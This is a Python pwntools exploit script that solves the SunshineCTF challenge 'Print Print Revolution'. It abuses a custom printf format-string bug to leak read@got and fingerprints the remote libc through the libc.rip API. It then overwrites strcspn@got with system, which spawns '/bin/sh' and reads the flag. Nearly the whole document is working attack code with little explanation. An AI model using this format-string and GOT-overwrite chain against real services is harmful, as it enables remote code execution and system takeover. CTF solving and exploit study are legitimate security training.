#!/usr/bin/env python3
# SunshineCTF - "Print Print Revolution"  (custom printf => format string)
#   %N$s = arbitrary read     %N$w = arbitrary write (*arg[N] = arg[N+1])
#   buffer starts at vararg index 6  => arg N lives at buffer offset (N-6)*8
#   No PIE (GOT fixed) + Partial RELRO (GOT writable)
#
# Chain: leak read@got -> id libc (libc.rip, NO download) -> overwrite
#        strcspn@got with system -> next line = system("/bin/sh") -> shell
#
#   python3 solve_revolution.py          # remote
#   python3 solve_revolution.py local    # local test with system libc

import sys, json, urllib.request
from pwn import *

context.binary = exe = ELF('./revolution', checksec=False)
context.log_level = 'info'

HOST, PORT   = 'chal.sunshinectf.games', 26002
READ_GOT     = 0x404018
STRCSPN_GOT  = 0x404010
LOCAL = len(sys.argv) > 1 and sys.argv[1] == 'local'

def leak(io, addr):
    io.sendline(b'%8$s'.ljust(16, b'P') + p64(addr))       # arg8 = offset16
    return u64(io.recvuntil(b'score> ')[:6].ljust(8, b'\x00'))

def write(io, addr, value):
    io.sendline(b'%8$w'.ljust(16, b'P') + p64(addr) + p64(value))  # arg8=ptr arg9=val
    io.recvuntil(b'score> ')

def libc_syms(read_addr):
    # libc.rip /find returns system, read, str_bin_sh offsets directly -> no .so download
    body = json.dumps({'symbols': {'read': hex(read_addr & 0xfff)}}).encode()
    req = urllib.request.Request('https://libc.rip/api/find', data=body,
                                 headers={'Content-Type': 'application/json'})
    ms = json.load(urllib.request.urlopen(req, timeout=20))
    if not ms:
        log.failure('no libc match; leak more symbols'); sys.exit(1)
    m = ms[0]
    log.success('remote libc: ' + m['id'])
    base = read_addr - int(m['symbols']['read'], 16)
    return base + int(m['symbols']['system'], 16)

io = process('./revolution') if LOCAL else remote(HOST, PORT)
io.recvuntil(b'score> ')

read_addr = leak(io, READ_GOT)
log.success('read@libc = %#x' % read_addr)

if LOCAL:
    system = exe.libc.address + exe.libc.sym['system']  # placeholder; overwritten below
    l = exe.libc; l.address = read_addr - l.sym['read']; system = l.sym['system']
else:
    system = libc_syms(read_addr)
log.success('system    = %#x' % system)

write(io, STRCSPN_GOT, system)          # strcspn@got -> system
io.sendline(b'/bin/sh\x00')             # main: strcspn(buf,..) == system("/bin/sh")
io.sendline(b'cat flag* /flag* 2>/dev/null; ls')
io.interactive()
